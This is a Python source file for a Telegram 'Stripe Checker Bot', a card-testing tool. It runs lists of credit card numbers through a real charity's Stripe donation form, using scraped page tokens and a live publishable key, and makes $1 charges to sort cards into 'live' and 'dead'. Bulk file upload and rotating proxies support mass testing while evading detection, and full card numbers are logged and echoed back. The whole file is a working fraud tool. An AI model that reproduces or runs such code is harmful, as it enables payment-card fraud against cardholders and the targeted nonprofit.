import os
import re
import json
import asyncio
import random
import requests
import logging
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode

# ============== KONFIGURASI ==============
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
DELAY_BETWEEN = int(os.getenv("DELAY_BETWEEN", "3"))
GATE_URL = "https://peerchange.org/stripe-donation/"
# Proxy from env: single proxy or comma-separated list
# Format: http://user:pass@host:port or socks5://user:pass@host:port
PROXY_ENV = os.getenv("PROXY_URL", "")
# ==========================================

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# Suppress noisy HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
logging.getLogger("telegram.ext").setLevel(logging.WARNING)

# Track active tasks per user to support /stop
active_tasks: dict[int, bool] = {}

# ============== PROXY MANAGER ==============

def check_proxy(proxy_url: str, timeout: int = 10) -> bool:
    """Test if a proxy is alive by making a request to httpbin."""
    proxies = {"http": proxy_url, "https": proxy_url}
    test_urls = [
        "https://httpbin.org/ip",
        "https://api.ipify.org?format=json",
        "http://ip-api.com/json",
    ]
    for url in test_urls:
        try:
            r = requests.get(url, proxies=proxies, timeout=timeout)
            if r.status_code == 200:
                return True
        except Exception:
            continue
    return False


class ProxyManager:
    """Manages proxy list with rotation and health check."""

    def __init__(self):
        self.proxies: list[str] = []
        self.index = 0
        # Load from env if set
        if PROXY_ENV:
            self.proxies = [p.strip() for p in PROXY_ENV.split(",") if p.strip()]
            logger.info(f"Loaded {len(self.proxies)} proxy(s) from env")

    def add(self, proxy: str):
        """Add a single proxy."""
        proxy = proxy.strip()
        if proxy and proxy not in self.proxies:
            self.proxies.append(proxy)

    def add_list(self, proxy_list: list[str]):
        """Add multiple proxies."""
        for p in proxy_list:
            self.add(p)

    def remove(self, proxy_url: str):
        """Remove a specific proxy."""
        if proxy_url in self.proxies:
            self.proxies.remove(proxy_url)

    def clear(self):
        """Clear all proxies."""
        self.proxies.clear()
        self.index = 0

    def get_random(self) -> dict | None:
        """Get random proxy. Returns requests-compatible proxy dict."""
        if not self.proxies:
            return None
        proxy_url = random.choice(self.proxies)
        return {"http": proxy_url, "https": proxy_url}

    def get_random_url(self) -> str | None:
        """Get random proxy URL string."""
        if not self.proxies:
            return None
        return random.choice(self.proxies)

    @property
    def count(self) -> int:
        return len(self.proxies)

    @property
    def status_text(self) -> str:
        if not self.proxies:
            return "❌ No proxy"
        return f"✅ {len(self.proxies)} proxy(s)"


proxy_manager = ProxyManager()


async def validate_proxies(proxy_list: list[str], status_msg=None) -> tuple[list[str], list[str]]:
    """Check all proxies and return (live_proxies, dead_proxies). Updates status_msg if provided."""
    live = []
    dead = []
    total = len(proxy_list)

    for i, proxy_url in enumerate(proxy_list, 1):
        display = re.sub(r"://([^:]+):([^@]+)@", r"://***:***@", proxy_url)

        if status_msg and (i == 1 or i % 3 == 0 or i == total):
            try:
                await status_msg.edit_text(
                    f"🌐 <b>Checking Proxies...</b>\n\n"
                    f"├ Progress: <code>{i}/{total}</code>\n"
                    f"├ ✅ Live: <code>{len(live)}</code>\n"
                    f"├ ❌ Dead: <code>{len(dead)}</code>\n"
                    f"└ Testing: <code>{display}</code>",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass

        is_alive = await asyncio.to_thread(check_proxy, proxy_url)
        if is_alive:
            live.append(proxy_url)
        else:
            dead.append(proxy_url)

    return live, dead


def is_authorized(user_id: int) -> bool:
    """Check if user is authorized. If ADMIN_IDS is empty, allow everyone."""
    if not ADMIN_IDS:
        return True
    return user_id in ADMIN_IDS


def check_cc(cc: str, mm: str, yy: str, cvv: str, proxy: dict | None = None) -> tuple[str, str]:
    """Check satu CC via Stripe gateway. Returns (status, message)."""
    s = requests.Session()
    if proxy:
        s.proxies.update(proxy)

    headers1 = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US",
        "cache-control": "max-age=0",
        "referer": "https://www.google.com/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    }

    try:
        response = s.get(GATE_URL, headers=headers1, timeout=30)
        html = response.text
        match = re.search(r"var wpsdAdminScriptObj = ({.*?});", html)

        if not match:
            return "ERROR", "Failed to get page tokens"

        data = json.loads(match.group(1))
        idem = data.get("idempotency")
        sec = data.get("security")

        headers2 = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://peerchange.org",
            "referer": GATE_URL,
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        payload = {
            "action": "wpsd_donation",
            "name": "Luis ofc",
            "email": "rimagoaha@boxfi.uk",
            "amount": "1",
            "donation_for": "Peer Driven Change",
            "currency": "USD",
            "idempotency": idem,
            "security": sec,
            "stripeSdk": "",
        }

        response = s.post(
            "https://peerchange.org/wp-admin/admin-ajax.php",
            headers=headers2,
            data=payload,
            timeout=30,
        )
        res_json = json.loads(response.text)
        client_secret = res_json["data"]["client_secret"]
        pii = client_secret.split("_secret")[0]

        headers3 = {
            "accept": "application/json",
            "accept-language": "en-US",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
        }

        confirm_data = (
            f"payment_method_data[type]=card"
            f"&payment_method_data[billing_details][name]=Luis+ofc+"
            f"&payment_method_data[billing_details][email]=rimagoaha%40boxfi.uk"
            f"&payment_method_data[card][number]={cc}"
            f"&payment_method_data[card][cvc]={cvv}"
            f"&payment_method_data[card][exp_month]={mm}"
            f"&payment_method_data[card][exp_year]={yy}"
            f"&payment_method_data[guid]=bf2ed44f-285a-461e-acee-257a3fa7af5abe8e4f"
            f"&payment_method_data[muid]=037bcddb-a736-4a06-8312-928d3ca6b6a807d321"
            f"&payment_method_data[sid]=22527fd6-90b7-4263-8a5d-560f9d264081fea74e"
            f"&payment_method_data[payment_user_agent]=stripe.js%2Ff93cb2e34f%3B+stripe-js-v3%2Ff93cb2e34f%3B+card-element"
            f"&payment_method_data[referrer]=https%3A%2F%2Fpeerchange.org"
            f"&payment_method_data[time_on_page]=51715"
            f"&expected_payment_method_type=card"
            f"&use_stripe_sdk=true"
            f"&key=pk_live_51J2gmMInBOIP2TtwJ2PC6acBxOYVCsAPV5ENvS70wh3isa2acwJLBVYWS3SYpsbTrrsn6XTjqDRVpATGTu1JpJW600UsLorNGk"
            f"&client_secret={client_secret}"
        )

        response = s.post(
            f"https://api.stripe.com/v1/payment_intents/{pii}/confirm",
            headers=headers3,
            data=confirm_data,
            timeout=30,
        )

        resp_json = response.json()

        if "error" in resp_json:
            err = resp_json["error"]
            if "decline_code" in err:
                msg = err["decline_code"].replace("_", " ").title()
                # Insufficient funds = CC valid tapi saldo kurang
                if err["decline_code"] == "insufficient_funds":
                    return "LIVE", f"CCN ✅ ({msg})"
                return "DEAD", msg
            else:
                msg = err.get("message", "Unknown error")
                return "DEAD", msg
        else:
            return "LIVE", "Charged $1 ✅"

    except Exception as e:
        return "ERROR", str(e)[:100]


# ============== TELEGRAM HANDLERS ==============

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_authorized(user.id):
        await update.message.reply_text("⛔ You are not authorized.")
        return

    text = (
        f"👋 <b>Welcome, {user.first_name}!</b>\n\n"
        f"🔥 <b>Stripe Checker Bot</b>\n"
        f"├ Gate: <code>peerchange.org</code>\n"
        f"├ Amount: <code>$1 USD</code>\n"
        f"├ Delay: <code>{DELAY_BETWEEN}s</code>\n"
        f"└ Proxy: {proxy_manager.status_text}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📌 <b>Commands:</b>\n"
        f"/chk <code>cc|mm|yy|cvv</code> — Check single CC\n"
        f"/stop — Stop running bulk check\n"
        f"/status — Bot status\n\n"
        f"🌐 <b>Proxy:</b>\n"
        f"/proxy — View proxy status\n"
        f"/setproxy <code>url</code> — Set proxy\n"
        f"/checkproxy — Re-check & remove dead proxies\n"
        f"/clearproxy — Remove all proxies\n\n"
        f"📝 <b>Or just send CC directly:</b>\n"
        f"<code>4111111111111111|01|28|123</code>\n\n"
        f"📎 <b>Bulk Mode:</b>\n"
        f"Send a <code>.txt</code> file containing CCs or proxies"
    )

    keyboard = [[InlineKeyboardButton("📊 Status", callback_data="status")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_authorized(user.id):
        return

    is_busy = active_tasks.get(user.id, False)
    status_emoji = "🔴 Checking..." if is_busy else "🟢 Idle"

    text = (
        f"📊 <b>Bot Status</b>\n\n"
        f"├ Status: {status_emoji}\n"
        f"├ Gate: <code>peerchange.org</code>\n"
        f"├ Amount: <code>$1 USD</code>\n"
        f"├ Delay: <code>{DELAY_BETWEEN}s</code>\n"
        f"├ Proxy: {proxy_manager.status_text}\n"
        f"└ Time: <code>{datetime.now().strftime('%H:%M:%S')}</code>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        return

    if active_tasks.get(user_id, False):
        active_tasks[user_id] = False
        await update.message.reply_text("🛑 <b>Stopping...</b> Will stop after current CC finishes.", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("ℹ️ No active task to stop.")


async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View current proxy status."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        return

    if proxy_manager.count == 0:
        text = (
            "🌐 <b>Proxy Status</b>\n\n"
            "├ Status: ❌ No proxy set\n"
            "└ All requests use direct connection\n\n"
            "<b>Set proxy:</b>\n"
            "/setproxy <code>http://ip:port</code>\n"
            "/setproxy <code>http://user:pass@ip:port</code>\n"
            "/setproxy <code>socks5://ip:port</code>\n\n"
            "Or send a <code>.txt</code> file with proxy list"
        )
    else:
        proxy_list_preview = ""
        for i, p in enumerate(proxy_manager.proxies[:5]):
            # Mask credentials in display
            display = re.sub(r"://([^:]+):([^@]+)@", r"://***:***@", p)
            proxy_list_preview += f"  {i+1}. <code>{display}</code>\n"
        if proxy_manager.count > 5:
            proxy_list_preview += f"  ... +{proxy_manager.count - 5} more\n"

        text = (
            f"🌐 <b>Proxy Status</b>\n\n"
            f"├ Status: ✅ Active\n"
            f"├ Total: <code>{proxy_manager.count}</code>\n"
            f"├ Mode: Rotating\n"
            f"└ List:\n{proxy_list_preview}\n"
            f"/clearproxy — Remove all"
        )

    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def cmd_setproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set proxy. Supports single or multiple (space-separated)."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        return

    if not context.args:
        await update.message.reply_text(
            "❌ Usage:\n"
            "/setproxy <code>http://ip:port</code>\n"
            "/setproxy <code>http://user:pass@ip:port</code>\n"
            "/setproxy <code>socks5://ip:port</code>\n\n"
            "Or send multiple:\n"
            "/setproxy <code>http://ip1:port http://ip2:port</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    added = 0
    raw_proxies = []
    for arg in context.args:
        proxy = arg.strip()
        if re.match(r"^(https?|socks[45])://", proxy, re.IGNORECASE):
            raw_proxies.append(proxy)
        elif re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+", proxy):
            raw_proxies.append(f"http://{proxy}")

    if not raw_proxies:
        await update.message.reply_text(
            "❌ Invalid proxy format.\n"
            "Use: <code>http://ip:port</code> or <code>socks5://ip:port</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    # Auto-check proxies
    status_msg = await update.message.reply_text(
        f"🌐 <b>Checking {len(raw_proxies)} proxy(s)...</b>\n"
        f"└ Please wait, testing connectivity...",
        parse_mode=ParseMode.HTML,
    )

    live, dead = await validate_proxies(raw_proxies, status_msg)
    proxy_manager.add_list(live)

    result_text = (
        f"🌐 <b>Proxy Check Complete!</b>\n\n"
        f"├ Tested: <code>{len(raw_proxies)}</code>\n"
        f"├ ✅ Live: <code>{len(live)}</code>\n"
        f"├ ❌ Dead: <code>{len(dead)}</code>\n"
        f"└ Total active: <code>{proxy_manager.count}</code>"
    )
    if dead:
        dead_display = "\n".join([f"  • <code>{re.sub(r'://([^:]+):([^@]+)@', r'://***:***@', d)}</code>" for d in dead[:5]])
        if len(dead) > 5:
            dead_display += f"\n  ... +{len(dead) - 5} more"
        result_text += f"\n\n❌ <b>Removed dead:</b>\n{dead_display}"

    await status_msg.edit_text(result_text, parse_mode=ParseMode.HTML)


async def cmd_clearproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear all proxies."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        return

    old_count = proxy_manager.count
    proxy_manager.clear()
    await update.message.reply_text(
        f"🗑 <b>Proxy Cleared!</b>\n\n"
        f"├ Removed: <code>{old_count}</code>\n"
        f"└ Now using direct connection",
        parse_mode=ParseMode.HTML,
    )


async def cmd_checkproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Re-check all active proxies and remove dead ones."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        return

    if proxy_manager.count == 0:
        await update.message.reply_text(
            "❌ <b>No proxies to check.</b>\n"
            "└ Add proxies first with /setproxy or send a .txt file",
            parse_mode=ParseMode.HTML,
        )
        return

    current_proxies = list(proxy_manager.proxies)
    status_msg = await update.message.reply_text(
        f"🌐 <b>Re-checking {len(current_proxies)} proxy(s)...</b>\n"
        f"└ Please wait, testing connectivity...",
        parse_mode=ParseMode.HTML,
    )

    live, dead = await validate_proxies(current_proxies, status_msg)

    # Remove dead proxies from pool
    for d in dead:
        proxy_manager.remove(d)

    result_text = (
        f"🌐 <b>Proxy Re-check Complete!</b>\n\n"
        f"├ Tested: <code>{len(current_proxies)}</code>\n"
        f"├ ✅ Live: <code>{len(live)}</code>\n"
        f"├ ❌ Dead: <code>{len(dead)}</code>\n"
        f"└ Total active: <code>{proxy_manager.count}</code>"
    )
    if dead:
        dead_display = "\n".join([f"  • <code>{re.sub(r'://([^:]+):([^@]+)@', r'://***:***@', d)}</code>" for d in dead[:5]])
        if len(dead) > 5:
            dead_display += f"\n  ... +{len(dead) - 5} more"
        result_text += f"\n\n🗑 <b>Removed dead:</b>\n{dead_display}"

    if not live:
        result_text += "\n\n⚠️ <b>All proxies are dead!</b> Now using direct connection."

    await status_msg.edit_text(result_text, parse_mode=ParseMode.HTML)


async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ You are not authorized.")
        return

    if not context.args:
        await update.message.reply_text(
            "❌ Format: <code>/chk cc|mm|yy|cvv</code>\n"
            "Bisa juga kirim banyak CC sekaligus.",
            parse_mode=ParseMode.HTML,
        )
        return

    # Collect all valid CC lines from args (supports multi-line input)
    raw_text = " ".join(context.args)
    all_tokens = re.split(r"[\s]+", raw_text)
    cc_pattern = re.compile(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")
    cc_lines = [t for t in all_tokens if cc_pattern.match(t)]

    if not cc_lines:
        await update.message.reply_text(
            "❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    # Multiple CCs → bulk mode
    if len(cc_lines) > 1:
        await process_bulk(update, context, cc_lines)
        return

    # Single CC → inline check
    parts = cc_lines[0].split("|")
    cc, mm, yy, cvv = parts
    fullcc = f"{cc}|{mm}|{yy}|{cvv}"

    proxy = proxy_manager.get_random()
    proxy_label = "✅" if proxy else "❌"

    msg = await update.message.reply_text(
        f"⏳ <b>Checking...</b>\n<code>{fullcc}</code>\n🌐 Proxy: {proxy_label}",
        parse_mode=ParseMode.HTML,
    )

    status, result = await asyncio.to_thread(check_cc, cc, mm, yy, cvv, proxy)

    if status == "LIVE":
        emoji = "✅"
        header = "APPROVED"
        logger.info(f"✅ LIVE | {fullcc} | {result}")
    elif status == "DEAD":
        emoji = "❌"
        header = "DECLINED"
        logger.info(f"❌ DEAD | {fullcc} | {result}")
    else:
        emoji = "⚠️"
        header = "ERROR"
        logger.warning(f"⚠️ ERROR | {fullcc} | {result}")

    text = (
        f"{emoji} <b>{header}</b>\n\n"
        f"├ CC: <code>{fullcc}</code>\n"
        f"├ Status: <b>{status}</b>\n"
        f"├ Response: <code>{result}</code>\n"
        f"├ Gate: <code>Stripe [peerchange.org]</code>\n"
        f"└ Amount: <code>$1 USD</code>"
    )

    await msg.edit_text(text, parse_mode=ParseMode.HTML)


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle CC yang dikirim langsung sebagai text."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        return

    text = update.message.text.strip()

    # Check if it looks like CC format
    lines = [l.strip() for l in text.split("\n") if l.strip()]
    cc_lines = [l for l in lines if re.match(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$", l)]

    if not cc_lines:
        return  # Not CC format, ignore

    if len(cc_lines) == 1:
        # Single CC - check inline
        parts = cc_lines[0].split("|")
        cc, mm, yy, cvv = parts
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"

        proxy = proxy_manager.get_random()

        msg = await update.message.reply_text(
            f"⏳ <b>Checking...</b>\n<code>{fullcc}</code>",
            parse_mode=ParseMode.HTML,
        )

        status, result = await asyncio.to_thread(check_cc, cc, mm, yy, cvv, proxy)

        if status == "LIVE":
            emoji, header = "✅", "APPROVED"
            logger.info(f"✅ LIVE | {fullcc} | {result}")
        elif status == "DEAD":
            emoji, header = "❌", "DECLINED"
            logger.info(f"❌ DEAD | {fullcc} | {result}")
        else:
            emoji, header = "⚠️", "ERROR"
            logger.warning(f"⚠️ ERROR | {fullcc} | {result}")

        reply = (
            f"{emoji} <b>{header}</b>\n\n"
            f"├ CC: <code>{fullcc}</code>\n"
            f"├ Status: <b>{status}</b>\n"
            f"├ Response: <code>{result}</code>\n"
            f"├ Gate: <code>Stripe [peerchange.org]</code>\n"
            f"└ Amount: <code>$1 USD</code>"
        )
        await msg.edit_text(reply, parse_mode=ParseMode.HTML)
    else:
        # Multiple CC - bulk mode
        await process_bulk(update, context, cc_lines)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file .txt — auto-detect CC list or proxy list."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ You are not authorized.")
        return

    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Only <code>.txt</code> files are supported.", parse_mode=ParseMode.HTML)
        return

    file = await context.bot.get_file(doc.file_id)
    content = bytes(await file.download_as_bytearray()).decode("utf-8")

    lines = [l.strip() for l in content.split("\n") if l.strip()]

    # Auto-detect: proxy list or CC list
    proxy_pattern = re.compile(r"^(https?|socks[45])://", re.IGNORECASE)
    # Also support ip:port, ip:port:user:pass, user:pass@ip:port
    proxy_plain_pattern = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+")

    proxy_lines = [l for l in lines if proxy_pattern.match(l) or proxy_plain_pattern.match(l)]
    cc_lines = [l for l in lines if re.match(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$", l)]

    # If file name contains "proxy" or most lines are proxies, treat as proxy file
    is_proxy_file = (
        "proxy" in doc.file_name.lower()
        or (len(proxy_lines) > 0 and len(proxy_lines) >= len(cc_lines))
    )

    if is_proxy_file and proxy_lines:
        # Process as proxy list
        formatted = []
        for p in proxy_lines:
            if proxy_pattern.match(p):
                formatted.append(p)
            elif proxy_plain_pattern.match(p):
                formatted.append(f"http://{p}")

        # Auto-check proxies
        status_msg = await update.message.reply_text(
            f"🌐 <b>Checking {len(formatted)} proxy(s)...</b>\n"
            f"└ Please wait, testing connectivity...",
            parse_mode=ParseMode.HTML,
        )

        live, dead = await validate_proxies(formatted, status_msg)
        proxy_manager.add_list(live)

        result_text = (
            f"🌐 <b>Proxy Check Complete!</b>\n\n"
            f"├ Tested: <code>{len(formatted)}</code>\n"
            f"├ ✅ Live: <code>{len(live)}</code>\n"
            f"├ ❌ Dead: <code>{len(dead)}</code>\n"
            f"├ Mode: Random rotation\n"
            f"└ Total active: <code>{proxy_manager.count}</code>"
        )
        if dead:
            dead_display = "\n".join([f"  • <code>{re.sub(r'://([^:]+):([^@]+)@', r'://***:***@', d)}</code>" for d in dead[:5]])
            if len(dead) > 5:
                dead_display += f"\n  ... +{len(dead) - 5} more"
            result_text += f"\n\n❌ <b>Removed dead:</b>\n{dead_display}"

        await status_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        return

    if not cc_lines:
        await update.message.reply_text(
            "❌ No valid CC or proxy found in file.\n"
            "CC format: <code>cc|mm|yy|cvv</code>\n"
            "Proxy format: <code>http://ip:port</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    await process_bulk(update, context, cc_lines)


async def process_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE, cc_lines: list[str]):
    """Process multiple CCs."""
    user_id = update.effective_user.id

    if active_tasks.get(user_id, False):
        await update.message.reply_text("⚠️ You already have an active task. Use /stop first.")
        return

    total = len(cc_lines)
    active_tasks[user_id] = True

    live_list = []
    dead_list = []
    error_count = 0

    status_msg = await update.message.reply_text(
        f"🔄 <b>Bulk Check Started</b>\n\n"
        f"├ Total: <code>{total} CC</code>\n"
        f"├ Delay: <code>{DELAY_BETWEEN}s</code>\n"
        f"├ Proxy: {proxy_manager.status_text}\n"
        f"├ Progress: <code>0/{total}</code>\n"
        f"└ Use /stop to cancel",
        parse_mode=ParseMode.HTML,
    )

    last_update_time = 0

    for i, line in enumerate(cc_lines, 1):
        # Check if user requested stop
        if not active_tasks.get(user_id, False):
            await status_msg.edit_text(
                f"🛑 <b>Stopped at {i-1}/{total}</b>\n\n"
                f"├ ✅ Live: <code>{len(live_list)}</code>\n"
                f"├ ❌ Dead: <code>{len(dead_list)}</code>\n"
                f"└ ⚠️ Error: <code>{error_count}</code>",
                parse_mode=ParseMode.HTML,
            )
            break

        parts = line.split("|")
        if len(parts) != 4:
            error_count += 1
            continue

        cc, mm, yy, cvv = parts
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"

        # Random proxy rotation — each attempt uses a different proxy
        proxy = proxy_manager.get_random()
        proxy_url_display = "Direct" if not proxy else re.sub(r"://([^:]+):([^@]+)@", r"://***:***@", list(proxy.values())[0])
        status, result = await asyncio.to_thread(check_cc, cc, mm, yy, cvv, proxy)

        if status == "LIVE":
            live_list.append((line, result))
            logger.info(f"✅ LIVE  | [{i}/{total}] {fullcc} | {result} | proxy: {proxy_url_display}")
            # Send live CC immediately
            await update.message.reply_text(
                f"✅ <b>LIVE FOUND!</b>\n\n"
                f"├ CC: <code>{fullcc}</code>\n"
                f"├ Response: <code>{result}</code>\n"
                f"├ Gate: <code>Stripe [peerchange.org]</code>\n"
                f"├ Proxy: <code>{proxy_url_display}</code>\n"
                f"└ [{i}/{total}]",
                parse_mode=ParseMode.HTML,
            )
        elif status == "DEAD":
            dead_list.append((line, result))
            logger.info(f"❌ DEAD  | [{i}/{total}] {fullcc} | {result} | proxy: {proxy_url_display}")
        else:
            error_count += 1
            logger.warning(f"⚠️ ERROR | [{i}/{total}] {fullcc} | {result} | proxy: {proxy_url_display}")

        # Update progress setiap 5 CC atau di akhir (rate limit Telegram edit)
        now = asyncio.get_event_loop().time()
        if i == total or i % 5 == 0 or (now - last_update_time) > 5:
            last_update_time = now
            progress_bar = "█" * int(i / total * 10) + "░" * (10 - int(i / total * 10))
            try:
                await status_msg.edit_text(
                    f"🔄 <b>Bulk Checking...</b>\n\n"
                    f"├ Progress: <code>[{progress_bar}] {i}/{total}</code>\n"
                    f"├ ✅ Live: <code>{len(live_list)}</code>\n"
                    f"├ ❌ Dead: <code>{len(dead_list)}</code>\n"
                    f"├ ⚠️ Error: <code>{error_count}</code>\n"
                    f"├ 🌐 Proxy: <code>{proxy_url_display}</code>\n"
                    f"└ Last: <code>{fullcc} → {status}</code>",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass  # Ignore edit errors (rate limit)

        if i < total and active_tasks.get(user_id, False):
            await asyncio.sleep(DELAY_BETWEEN)

    active_tasks[user_id] = False

    # Final summary
    summary = (
        f"📊 <b>BULK CHECK COMPLETE</b>\n\n"
        f"┌─────────────────────\n"
        f"├ Total: <code>{total}</code>\n"
        f"├ ✅ Live: <code>{len(live_list)}</code>\n"
        f"├ ❌ Dead: <code>{len(dead_list)}</code>\n"
        f"├ ⚠️ Error: <code>{error_count}</code>\n"
        f"├ Gate: <code>Stripe [peerchange.org]</code>\n"
        f"└─────────────────────"
    )

    if live_list:
        summary += "\n\n🏆 <b>Live CCs:</b>\n"
        for line, res in live_list:
            summary += f"• <code>{line}</code> — {res}\n"

    await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)


async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "status":
        user_id = query.from_user.id
        is_busy = active_tasks.get(user_id, False)
        status_emoji = "🔴 Checking..." if is_busy else "🟢 Idle"

        text = (
            f"📊 <b>Bot Status</b>\n\n"
            f"├ Status: {status_emoji}\n"
            f"├ Gate: <code>peerchange.org</code>\n"
            f"├ Amount: <code>$1 USD</code>\n"
            f"├ Delay: <code>{DELAY_BETWEEN}s</code>\n"
            f"├ Proxy: {proxy_manager.status_text}\n"
            f"└ Time: <code>{datetime.now().strftime('%H:%M:%S')}</code>"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.HTML)


def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN environment variable not set!")
        return

    app = Application.builder().token(BOT_TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_start))
    app.add_handler(CommandHandler("chk", cmd_chk))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("setproxy", cmd_setproxy))
    app.add_handler(CommandHandler("checkproxy", cmd_checkproxy))
    app.add_handler(CommandHandler("clearproxy", cmd_clearproxy))

    # Document handler (for .txt files)
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Text handler (for direct CC input)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    # Callback handler
    app.add_handler(CallbackQueryHandler(callback_handler))

    logger.info("Bot started! Polling...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
